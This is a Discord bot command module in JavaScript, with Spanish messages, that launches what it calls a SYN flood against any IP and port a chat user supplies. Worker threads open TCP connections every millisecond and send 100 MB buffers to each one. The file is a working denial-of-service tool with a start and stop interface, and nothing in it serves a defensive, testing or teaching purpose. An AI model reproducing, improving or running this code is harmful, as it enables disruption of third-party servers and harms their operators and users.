const { EmbedBuilder } = require('discord.js');
const net = require('net');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

let workers = [];
let attackInProgress = false;
let totalPacketsSent = 0;

module.exports = {
    name: 'synflood',
    description: 'Inicia o detiene un ataque SYN Flood',
    execute(message, args) {
        if (args[0] === 'stop') {
            if (attackInProgress) {
                stopAttack(message);
            } else {
                const noAttackEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription('❌ No hay ningún ataque en curso.')
                    .setTimestamp();
                return message.channel.send({ embeds: [noAttackEmbed] });
            }
        }

        if (args.length !== 4) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('para usar este metodo ejecute: .synflood <IP> <Port> <Time> <Threads>\nEjemplo: .synflood 192.168.1.3 8080 60 30')
                .setTimestamp();
            return message.channel.send({ embeds: [usageEmbed] });
        }

        const [ip, port, time, threads] = args;

        if (!isValidIP(ip)) {
            const invalidIpEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('❌ IP no válida.')
                .setTimestamp();
            return message.channel.send({ embeds: [invalidIpEmbed] });
        }

        const embed = new EmbedBuilder()
            .setColor(getRandomColor())
            .setTitle('💻 Iniciando ataque SYN Flood 💻')
            .setDescription(`**Método:** .synflood\n\n**IP:** ${ip}\n**Port:** ${port}\n**Threads:** ${threads}\n**Time:** ${time}`)
            .setTimestamp();

        message.channel.send({ embeds: [embed] });

        attackInProgress = true;
        let workersCompleted = 0;

        for (let i = 0; i < threads; i++) {
            try {
                const worker = new Worker(__filename, {
                    workerData: { ip, port, time }
                });

                workers.push(worker);

                worker.on('message', (msg) => {
                    if (msg.packetsSent) {
                        totalPacketsSent += msg.packetsSent;
                    }

                    workersCompleted++;
                    if (workersCompleted === threads) {
                        attackInProgress = false;
                        const finalEmbed = new EmbedBuilder()
                            .setColor(getRandomColor())
                            .setDescription(`✅ **Ataque finalizado**. Paquetes enviados: ${totalPacketsSent} 🚀`)
                            .setTimestamp();
                        message.channel.send({ embeds: [finalEmbed] });
                    }
                });

                worker.on('error', (err) => {
                    const errorEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setDescription(`❌ Error en el worker: ${err.message}`)
                        .setTimestamp();
                    message.channel.send({ embeds: [errorEmbed] });
                });
            } catch (err) {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription(`❌ Error al crear el worker: ${err.message}`)
                    .setTimestamp();
                message.channel.send({ embeds: [errorEmbed] });
            }
        }
    }
};

function stopAttack(message) {
    if (workers && workers.length > 0) {
        workers.forEach(worker => worker.terminate());
    }
    const attacksStopped = workers.length;
    workers = [];
    attackInProgress = false;

    const stopEmbed = new EmbedBuilder()
        .setColor('#FF0000')
        .setDescription(`🛑 **Ataque detenido correctamente**.Ataques detenidos: ${attacksStopped} 🚫`)
        .setTimestamp();
    message.channel.send({ embeds: [stopEmbed] });
}

function isValidIP(ip) {
    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return regex.test(ip);
}

function getRandomColor() {
    const colors = ['#FF5733', '#33FF57', '#3357FF', '#FF33A1', '#A133FF'];
    return colors[Math.floor(Math.random() * colors.length)];
}

if (!isMainThread) {
    const { ip, port, time } = workerData;
    let packetsSent = 0;

    const interval = setInterval(() => {
        const socket = new net.Socket();
        socket.connect(port, ip, () => {
            // Enviar un paquete más grande para aumentar la carga
            const payload = Buffer.alloc(100 * 1024 * 1024, 'SYN PACKETS KKJ'); // Paquete de 100MB
            socket.write(payload);
            packetsSent++;
        });
        socket.on('error', () => {
            socket.destroy();
        });
    }, 1); // Reducido el intervalo para aumentar la intensidad

    setTimeout(() => {
        clearInterval(interval);
        parentPort.postMessage({ packetsSent });
    }, time * 1000);
}
